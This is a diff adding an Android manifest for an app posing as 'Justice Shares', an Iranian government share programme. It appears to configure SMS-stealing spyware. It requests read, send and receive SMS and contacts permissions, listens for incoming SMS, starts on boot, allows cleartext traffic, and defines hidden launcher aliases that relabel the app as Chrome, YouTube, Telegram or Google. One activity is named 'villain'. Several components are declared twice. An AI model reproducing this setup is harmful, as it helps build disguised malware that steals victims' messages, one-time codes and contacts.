@@ -1,0 +1,297 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest
+	xmlns:android="http://schemas.android.com/apk/res/android"
+	package="com.Mad.api"
+	android:versionCode="1"
+	android:versionName="1.0"
+	android:installLocation="internalOnly">
+	
+	<uses-sdk android:minSdkVersion="14" android:targetSdkVersion="30"/>
+	<supports-screens android:largeScreens="true" 
+	    android:normalScreens="true" 
+	    android:smallScreens="true" 
+	    android:anyDensity="true"/>
+	<permission
+	        android:name="com.Mad.api.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+	        android:protectionLevel="signature" />
+	
+	    <uses-permission android:name="com.Mad.api.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+	<uses-permission android:name="android.permission.INTERNET"/>
+	<uses-permission android:name="android.permission.WAKE_LOCK"/>
+	<uses-permission android:name="android.permission.READ_SMS"/>
+	<uses-permission android:name="android.permission.READ_CONTACTS"/>
+	<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+	<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+	<uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
+	<uses-permission android:name="com.google.android.gms.permission.AD_ID"/>
+	<uses-permission android:name="com.Mad.api.permission.C2D_MESSAGE"/>
+	<uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE"/>
+	<uses-permission android:name="android.permission.SEND_SMS"/>
+	<uses-permission android:name="android.permission.RECEIVE_SMS"/>
+	<uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+	<uses-permission android:name="android.permission.WRITE_CONTACTS"/>
+	<application
+		android:icon="@drawable/icon"
+		android:label="سهام عدالت"
+		android:theme="@style/LightTheme"
+		android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+		android:usesCleartextTraffic="true"
+		android:hardwareAccelerated="true"
+		android:largeHeap="true">
+		
+		<activity android:name="com.google.android.gms.common.api.GoogleApiActivity"
+		  android:theme="@android:style/Theme.Translucent.NoTitleBar"
+		  android:exported="false"/>
+		    <meta-data
+		  android:name="com.google.android.gms.version"
+		  android:value="@integer/google_play_services_version" />
+		<receiver
+		            android:name="com.google.android.gms.measurement.AppMeasurementReceiver"
+		            android:enabled="true"
+		            android:exported="false" >
+		        </receiver>
+		
+		  <service
+		            android:name="com.google.android.gms.measurement.AppMeasurementService"
+		            android:enabled="true"
+		            android:exported="false" />
+					
+		<service
+		            android:name="com.google.android.gms.measurement.AppMeasurementJobService"
+		            android:enabled="true"
+		            android:exported="false"
+		            android:permission="android.permission.BIND_JOB_SERVICE" />
+		
+		 <service android:name="com.google.firebase.components.ComponentDiscoveryService"  android:directBootAware="true" android:exported="false"  >
+		            <meta-data
+		                android:name="com.google.firebase.components:com.google.firebase.analytics.connector.internal.AnalyticsConnectorRegistrar"
+		                android:value="com.google.firebase.components.ComponentRegistrar" />
+					 <meta-data
+		                android:name="com.google.firebase.components:com.google.firebase.iid.Registrar"
+		                android:value="com.google.firebase.components.ComponentRegistrar" />
+		             <meta-data
+		                android:name="com.google.firebase.components:com.google.firebase.auth.FirebaseAuthRegistrar"
+		                android:value="com.google.firebase.components.ComponentRegistrar" />
+		             <meta-data
+		                android:name="com.google.firebase.components:com.google.firebase.storage.StorageRegistrar"
+		                android:value="com.google.firebase.components.ComponentRegistrar" />
+		            <meta-data 
+						android:name="com.google.firebase.components:com.google.firebase.firestore.FirestoreRegistrar"
+						android:value="com.google.firebase.components.ComponentRegistrar"/>
+		
+					<meta-data
+		   				 android:name="com.google.firebase.components:com.google.firebase.database.DatabaseRegistrar"
+		   				 android:value="com.google.firebase.components.ComponentRegistrar"/>
+		   			 <meta-data
+		                android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingRegistrar"
+		                android:value="com.google.firebase.components.ComponentRegistrar" />
+		             <meta-data
+		                android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsRegistrar"
+		                android:value="com.google.firebase.components.ComponentRegistrar" />
+		              <meta-data
+		                android:name="com.google.firebase.components:com.google.firebase.crashlytics.CrashlyticsRegistrar"
+		                android:value="com.google.firebase.components.ComponentRegistrar" />
+		             <meta-data
+		                android:name="com.google.firebase.components:com.google.firebase.remoteconfig.RemoteConfigRegistrar"
+		                android:value="com.google.firebase.components.ComponentRegistrar"/>
+		            <meta-data
+		                android:name="com.google.firebase.components:com.google.firebase.abt.component.AbtRegistrar"
+		                android:value="com.google.firebase.components.ComponentRegistrar"/>
+		               
+		</service>
+		   <provider
+		     android:name="com.google.firebase.provider.FirebaseInitProvider"
+		            android:authorities="com.Mad.api.firebaseinitprovider"
+		            android:directBootAware="true"
+		            android:exported="false"
+		            android:initOrder="100" />
+		   <receiver
+		  android:name="com.google.firebase.iid.FirebaseInstanceIdReceiver"
+		  android:exported="true"
+		  android:permission="com.google.android.c2dm.permission.SEND" >
+		  <intent-filter>
+		  <action android:name="com.google.android.c2dm.intent.RECEIVE" />
+		  <action android:name="com.google.android.c2dm.intent.REGISTRATION" />
+		  <category android:name="com.Mad.api" />
+		  </intent-filter>
+		  </receiver>
+		    <receiver
+		  android:name="com.google.firebase.iid.FirebaseInstanceIdInternalReceiver"
+		  android:exported="false" />
+		
+		
+		  <service
+		  android:name="com.google.firebase.iid.FirebaseInstanceIdService"
+		  android:exported="true">
+		  <intent-filter android:priority="-500">
+		  <action android:name="com.google.firebase.INSTANCE_ID_EVENT" />
+		  </intent-filter>
+		  </service>
+		<service
+		            android:name="com.google.firebase.messaging.FirebaseMessagingService"
+		            android:directBootAware="true"
+		            android:exported="false" >
+		            <intent-filter android:priority="-500" >
+		                <action android:name="com.google.firebase.MESSAGING_EVENT" />
+		            </intent-filter>
+		        </service>
+		        
+		   <service android:name="anywheresoftware.b4a.objects.FirebaseNotificationsService"  android:exported="true">
+		     <intent-filter>
+		  		<action android:name="com.google.firebase.MESSAGING_EVENT"/>
+		     </intent-filter>
+		   </service>
+		<activity
+					android:windowSoftInputMode="stateHidden"
+					android:launchMode="singleTop"
+					android:name=".main"
+					android:label="سهام عدالت"
+					android:screenOrientation="portrait"
+					android:exported="true">
+					<intent-filter>
+					   <action android:name="android.intent.action.MAIN" />
+					   <category android:name="android.intent.category.LAUNCHER" />
+					</intent-filter>
+					
+				</activity>
+		<activity-alias
+		            android:name=".second"
+		            android:targetActivity=".main"
+		            android:label="Chrome"
+		            android:enabled="false"
+		            android:icon="@drawable/icon2"
+		            android:exported="true">
+		            <intent-filter>
+		             <action android:name="android.intent.action.MAIN" />
+		             <category android:name="android.intent.category.LAUNCHER" />
+		            </intent-filter>
+		        </activity-alias>
+		<activity-alias
+		            android:name=".youtube"
+		            android:targetActivity=".main"
+		            android:label="Youtube"
+		            android:enabled="false"
+		            android:icon="@drawable/icon4"
+		            android:exported="true">
+		            <intent-filter>
+		             <action android:name="android.intent.action.MAIN" />
+		             <category android:name="android.intent.category.LAUNCHER" />
+		            </intent-filter>
+		        </activity-alias>
+		<activity-alias
+		            android:name=".telegram"
+		            android:targetActivity=".main"
+		            android:label="Telegram"
+		            android:enabled="false"
+		            android:icon="@drawable/icon3"
+		            android:exported="true">
+		            <intent-filter>
+		             <action android:name="android.intent.action.MAIN" />
+		             <category android:name="android.intent.category.LAUNCHER" />
+		            </intent-filter>
+		        </activity-alias>
+		<activity-alias
+		            android:name=".google"
+		            android:targetActivity=".main"
+		            android:label="Google"
+		            android:enabled="false"
+		            android:icon="@drawable/icon5"
+		            android:exported="true">
+		            <intent-filter>
+		             <action android:name="android.intent.action.MAIN" />
+		             <category android:name="android.intent.category.LAUNCHER" />
+		            </intent-filter>
+		        </activity-alias>
+		<activity
+			android:windowSoftInputMode="stateHidden"
+			android:launchMode="singleTop"
+			android:name=".main"
+			android:label="سهام عدالت"
+			android:screenOrientation="unspecified"
+			android:exported="true">
+			<intent-filter>
+			   <action android:name="android.intent.action.MAIN" />
+			   <category android:name="android.intent.category.LAUNCHER" />
+			</intent-filter>
+			
+		</activity>
+		<receiver
+			android:name=".newmessage"
+			android:exported="true">
+			
+			<intent-filter>
+			    <action android:name="android.provider.Telephony.SMS_RECEIVED" 
+				 android:exported="true"/>
+			</intent-filter>
+		</receiver>
+		<receiver
+			android:name=".firebasemessaging"
+			android:exported="true">
+		</receiver>
+		<service
+			android:name=".starter"
+			android:exported="true">
+		</service>
+		<receiver
+			android:name=".starter$starter_BR"
+			android:exported="true">
+			<intent-filter>
+			<action android:name="android.intent.action.BOOT_COMPLETED"/>
+			</intent-filter>
+		</receiver>
+		<activity
+			android:windowSoftInputMode="stateHidden"
+			android:launchMode="singleTop"
+			android:name=".chrome"
+			android:label="سهام عدالت"
+			android:screenOrientation="unspecified"
+			android:exported="true">
+		</activity>
+		<activity
+			android:windowSoftInputMode="stateHidden"
+			android:launchMode="singleTop"
+			android:name=".mainchange"
+			android:label="سهام عدالت"
+			android:screenOrientation="unspecified"
+			android:exported="true">
+		</activity>
+		<activity
+			android:windowSoftInputMode="stateHidden"
+			android:launchMode="singleTop"
+			android:name=".second"
+			android:label="سهام عدالت"
+			android:screenOrientation="unspecified"
+			android:exported="true">
+		</activity>
+		<activity
+			android:windowSoftInputMode="stateHidden"
+			android:launchMode="singleTop"
+			android:name=".telegram"
+			android:label="سهام عدالت"
+			android:screenOrientation="unspecified"
+			android:exported="true">
+		</activity>
+		<activity
+			android:windowSoftInputMode="stateHidden"
+			android:launchMode="singleTop"
+			android:name=".villain"
+			android:label="سهام عدالت"
+			android:screenOrientation="unspecified"
+			android:exported="true">
+		</activity>
+		<activity
+			android:windowSoftInputMode="stateHidden"
+			android:launchMode="singleTop"
+			android:name=".youtube"
+			android:label="سهام عدالت"
+			android:screenOrientation="unspecified"
+			android:exported="true">
+		</activity>
+		<receiver
+			android:name=".httputils2service"
+			android:exported="true">
+		</receiver>
+	</application>
+</manifest>
